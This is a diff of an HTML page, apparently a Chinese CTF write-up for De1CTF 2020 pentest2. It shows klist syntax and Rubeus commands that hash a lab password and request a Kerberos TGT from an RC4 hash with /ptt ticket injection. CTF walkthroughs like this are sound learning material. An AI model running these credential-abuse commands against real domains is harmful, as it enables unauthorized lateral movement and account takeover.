@@ -220,12 +220,12 @@
 <p>klist语法</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">klist [-lh &lt;LogonId.HighPart&gt;] [-li &lt;LogonId.LowPart&gt;] tickets | tgt | purge | sessions | kcd_cache | get | add_bind | query_bind | purge_bind</span><br></pre></td></tr></table></figure>
 </blockquote>
-<img src="/2020/05/09/De1ctf-pentest2/image-20200507230043568.png" alt="image-20200507230043568" style="zoom:150%;">
-
+<p><img src="/2020/05/09/De1ctf-pentest2/image-20200507230043568.png" alt="image-20200508082613787"></p>
 <p>之后请求一个TGT,并导入会话中，</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe hash &#x2F;user:de1ta &#x2F;password:3f23ea12 &#x2F;domain:De1CTF2020.lab</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2020/05/09/De1ctf-pentest2/image-20200508082613787.png" alt="image-20200508082613787"></p>
+
+
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /ptt</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2020/05/09/De1ctf-pentest2/image-20200507225359017.png" alt="image-20200507225359017"></p>
